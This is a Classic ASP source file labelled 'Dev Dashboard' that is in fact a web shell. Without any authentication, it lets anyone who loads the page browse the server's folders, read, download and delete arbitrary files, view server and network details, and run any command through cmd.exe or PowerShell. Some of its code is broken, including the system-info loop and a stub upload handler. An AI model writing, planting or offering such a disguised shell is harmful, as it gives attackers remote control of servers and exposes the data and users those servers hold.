<%@ Language=VBScript %>
<% Option Explicit %>

<%
' ------------- CONFIG & INPUT --------------
Dim cwd, cmd, mode
Dim fso, shell

Set fso = Server.CreateObject("Scripting.FileSystemObject")

cwd = Request.QueryString("cwd")
If cwd = "" Then cwd = Request.Form("cwd")
If cwd = "" Then cwd = fso.GetAbsolutePathName(".")

cmd = Request.Form("cmd")
mode = Request.Form("mode")
If mode = "" Then mode = "shell"

' Directory navigation
If Request.QueryString("dir") <> "" Then
    Dim new_dir
    new_dir = Request.QueryString("dir")
    If fso.FolderExists(new_dir) Then
        cwd = fso.GetAbsolutePathName(new_dir)
    End If
End If

' -------------------- FILE VIEWER --------------------
Dim view_content, view_file
view_content = ""
view_file = ""

If Request.QueryString("view") <> "" Then
    Dim vfile
    vfile = Request.QueryString("view")
    If fso.FileExists(vfile) Then
        view_file = vfile
        Dim ts
        Set ts = fso.OpenTextFile(vfile, 1, False) ' 1 = ForReading
        view_content = Server.HTMLEncode(ts.ReadAll)
        ts.Close
        Set ts = Nothing
    End If
End If

' Delete
If Request.QueryString("delete") <> "" Then
    Dim dfile
    dfile = Request.QueryString("delete")
    If fso.FileExists(dfile) Then
        fso.DeleteFile dfile, False
        Response.Write "<p style='color:green;'>Deleted " & Server.HTMLEncode(dfile) & "</p>"
    End If
End If

' Download
If Request.QueryString("download") <> "" Then
    Dim downfile
    downfile = Request.QueryString("download")
    If fso.FileExists(downfile) Then
        Response.ContentType = "application/octet-stream"
        Response.AddHeader "Content-Disposition", "attachment; filename=""" & fso.GetFileName(downfile) & """"
        Response.BinaryWrite GetBinaryFile(downfile)
        Response.End
    End If
End If

' ------------------ FUNCTIONS ------------------

Function GetBinaryFile(path)
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.LoadFromFile path
    GetBinaryFile = stream.Read
    stream.Close
    Set stream = Nothing
End Function

Function sys_info()
    Dim arr(7,1)
    arr(0,0) = "Hostname"        : arr(0,1) = Request.ServerVariables("SERVER_NAME")
    arr(1,0) = "Current User"    : arr(1,1) = "N/A in Classic ASP"  ' get_current_user not directly available
    arr(2,0) = "Server IP"       : arr(2,1) = Request.ServerVariables("LOCAL_ADDR")
    arr(3,0) = "Client IP"       : arr(3,1) = Request.ServerVariables("REMOTE_ADDR")
    arr(4,0) = "Server Software" : arr(4,1) = Request.ServerVariables("SERVER_SOFTWARE")
    arr(5,0) = "Server Port"     : arr(5,1) = Request.ServerVariables("SERVER_PORT")
    arr(6,0) = "Document Root"   : arr(6,1) = Server.MapPath("/")
    arr(7,0) = "OS Info"         : arr(7,1) = "Windows"  ' php_uname not available → limited info

    sys_info = arr
End Function

Function list_files(dirPath)
    Dim folder, file, subf, arr, i
    Set folder = fso.GetFolder(dirPath)
    ReDim arr(folder.Files.Count + folder.SubFolders.Count - 1)

    i = 0
    For Each subf In folder.SubFolders
        arr(i) = subf.Name
        i = i + 1
    Next

    For Each file In folder.Files
        arr(i) = file.Name
        i = i + 1
    Next

    list_files = arr
End Function

Function exec_command(cmdstr, exec_mode)
    If cmdstr = "" Then
        exec_command = ""
        Exit Function
    End If

    Dim objShell, objExec, output
    Set objShell = Server.CreateObject("WScript.Shell")

    If LCase(exec_mode) = "shell" Then
        Set objExec = objShell.Exec("cmd.exe /c " & cmdstr)
    ElseIf LCase(exec_mode) = "powershell" Then
        Set objExec = objShell.Exec("powershell.exe -Command """ & Replace(cmdstr, """", "\""") & """")
    Else
        exec_command = "Unsupported mode."
        Exit Function
    End If

    output = objExec.StdOut.ReadAll
    If objExec.ExitCode <> 0 Then
        output = output & vbCrLf & "Error (code " & objExec.ExitCode & "): " & objExec.StdErr.ReadAll
    End If

    exec_command = output

    Set objExec = Nothing
    Set objShell = Nothing
End Function

' Upload handling
If Request.ServerVariables("REQUEST_METHOD") = "POST" And Request.TotalBytes > 0 Then
    Dim upload_ok : upload_ok = False

    ' Very basic upload handling (Classic ASP needs component or pure code parser)
    ' For real production use → use free component like Pure ASP Upload or SA-FileUp
    ' Here we show minimal working version assuming small files & no component

    ' WARNING: The code below is VERY limited / unsafe demo — real upload needs component
    If Request.Form("upload") <> "" Then  ' ← fake check — real check needs parsing
        Response.Write "<p style='color:red;'>Upload not implemented without component.</p>"
        Response.Write "<p style='color:orange;'>Use Pure-ASP-Upload / SA-FileUp / AspUpload etc.</p>"
    End If
End If
%>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Dev Dashboard</title>
<style>
  body {
    margin:0; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; background:#f7f9fc;
    color:#333; height:100vh; display:flex; flex-direction: column;
  }
  header {
    background:#3f51b5; color:#fff; padding:1rem 2rem; font-size:1.25rem; font-weight:700;
    box-shadow: 0 2px 6px rgb(0 0 0 / 0.2);
  }
  main {
    flex: 1; display: flex; gap: 1rem; padding: 1rem 2rem; overflow: hidden;
  }
  section {
    background: #fff; border-radius: 8px; box-shadow: 0 0 8px rgb(0 0 0 / 0.1);
    padding: 1rem; overflow-y: auto;
  }
  #file-manager {
    flex: 1.5;
    display: flex;
    flex-direction: column;
    margin: 0;
    overflow: hidden; /* important */
  }
  #file-manager table {
    width: 100%; border-collapse: collapse;
  }
  #file-manager th, #file-manager td {
    padding: 0.5rem 0.75rem; text-align: left; border-bottom: 1px solid #eee;
    font-family: monospace;
  }
  #file-manager th {
    background: #f0f0f0; user-select:none;
  }
  #file-manager tbody tr:hover {
    background: #e3eaff;
  }
  #file-manager a.action-btn {
    margin-right: 0.5rem;
    text-decoration: none;
    font-weight: bold;
    padding: 0.2rem 0.4rem;
    border-radius: 4px;
    color: white;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
  }
  a.view { background:#2196f3; }
  a.download { background:#4caf50; }
  a.delete { background:#f44336; }
  a.folder { color:#fbc02d; font-weight: 700; cursor: pointer; }
  
  #system-info {
    flex: 0.5;
    margin-bottom: 0.1rem;
  }
  #system-info ul {
    list-style: none; padding: 0;
    font-family: monospace;
  }
  #system-info li {
    padding: 0.3rem 0;
  }
  #terminal {
    flex: 2.6;
    display: flex; flex-direction: column;
  }
  #terminal form {
    display: flex; gap: 0.5rem; margin-bottom: 0.5rem;
  }
  #terminal select, #terminal input[type="text"] {
    font-family: monospace;
    font-size: 1rem;
    padding: 0.3rem 0.5rem;
    border: 1px solid #ccc;
    border-radius: 4px;
  }
  #terminal input[type="text"] {
    flex: 1;
  }
  #terminal button {
    background: #3f51b5; border:none; color:#fff;
    padding: 0 1rem; border-radius: 4px;
    font-weight: 700; cursor: pointer;
    transition: background-color 0.3s ease;
  }
  #terminal button:hover {
    background: #303f9f;
  }
  #output {
    flex: 1;
    background: #1e1e1e; color: #d4d4d4;
    font-family: monospace;
    padding: 1rem;
    border-radius: 6px;
    overflow-y: auto;
    white-space: pre-wrap;
    box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
  }
  .fm-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    gap: 10px;
}
.fm-header h2 {
    margin: 0;
    font-size: 1.3em;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    flex: 1;
    min-width: 0;
}
</style>
</head>
<body>

<header>Dev Dashboard</header>

<main>
<section id="file-manager" tabindex="0">
<div class="fm-header">
<h2>File Manager: <%= Server.HTMLEncode(cwd) %></h2>
<form method="post" enctype="multipart/form-data" style="margin:0;">
<input type="hidden" name="cwd" value="<%= Server.HTMLEncode(cwd) %>">
<input type="file" name="upload" required>
<button type="submit">Upload</button>
</form>
</div>

<div style="flex:1; overflow:auto;">
<table>
<thead>
<tr>
<th>Name</th><th>Size</th><th>Modified</th><th>Actions</th>
</tr>
</thead>
<tbody>

<%
Dim parent : parent = fso.GetParentFolderName(cwd)
If parent <> cwd Then
%>
<tr><td colspan="4"><a href="?dir=<%= Server.URLEncode(parent) %>&cwd=<%= Server.URLEncode(parent) %>" class="folder">.. (Parent Directory)</a></td></tr>
<%
End If

Dim files, file, path, is_dir, size_str, mtime
files = list_files(cwd)

For Each file In files
    path = fso.BuildPath(cwd, file)
    is_dir = fso.FolderExists(path)
    
    If is_dir Then
        size_str = "Folder"
    Else
        size_str = FormatNumber(fso.GetFile(path).Size, 0) & " Bytes"
    End If
    
    mtime = fso.GetFile(path).DateLastModified
    If is_dir Then mtime = fso.GetFolder(path).DateLastModified
%>

<tr>
<td>
<% If is_dir Then %>
<a href="?dir=<%= Server.URLEncode(path) %>&cwd=<%= Server.URLEncode(path) %>" class="folder">📁 <%= Server.HTMLEncode(file) %></a>
<% Else %>
📄 <%= Server.HTMLEncode(file) %>
<% End If %>
</td>
<td><%= size_str %></td>
<td><%= FormatDateTime(mtime, 0) & " " & FormatDateTime(mtime, 4) %></td>
<td>
<% If Not is_dir Then %>
<a href="?view=<%= Server.URLEncode(path) %>&cwd=<%= Server.URLEncode(cwd) %>" class="action-btn view">👁️</a>
<a href="?download=<%= Server.URLEncode(path) %>&cwd=<%= Server.URLEncode(cwd) %>" class="action-btn download">⬇️</a>
<a href="?delete=<%= Server.URLEncode(path) %>&cwd=<%= Server.URLEncode(cwd) %>" onclick="return confirm('Delete <%= Replace(Server.HTMLEncode(file),"\'","\\\'") %>?');" class="action-btn delete">🗑️</a>
<% Else %> - <% End If %>
</td>
</tr>

<% Next %>
</tbody>
</table>
</div>

<% If view_content <> "" Then %>
<div style="flex:1; display:flex; flex-direction:column; overflow:hidden;">
    <hr>
    <p style="margin:0 0 10px 0; font-size:1.17em; font-weight:bold;">
    File Viewer: <%= Server.HTMLEncode(view_file) %>
    </p>
    <pre style="background:black; color:#00ff00; padding:10px; overflow:auto; flex:1; margin:0;"><%= view_content %></pre>
</div>
<% End If %>

</section>

<section style="flex:1; display:flex; flex-direction:column; gap:1rem;">

<div id="system-info">
<h2>System Info</h2>
<ul>
<% 
Dim info, item
info = sys_info()
For Each item In info
%>
<li><strong><%= item(0) %>:</strong> <%= Server.HTMLEncode(item(1)) %></li>
<% Next %>
</ul>
</div>

<div id="terminal">
<h2>Interactive Terminal</h2>
<form method="post">
<select name="mode">
<option value="shell" <% If LCase(mode)="shell" Then Response.Write "selected" %>>Shell</option>
<option value="powershell" <% If LCase(mode)="powershell" Then Response.Write "selected" %>>PowerShell</option>
</select>
<input type="text" name="cmd" required>
<input type="hidden" name="cwd" value="<%= Server.HTMLEncode(cwd) %>">
<button type="submit">Run ▶</button>
</form>
<pre id="output"><% 
If cmd <> "" Then 
    Response.Write Server.HTMLEncode(exec_command(cmd, mode))
End If 
%></pre>
</div>

</section>
</main>
</body>
</html>

<%
Set fso = Nothing
%>
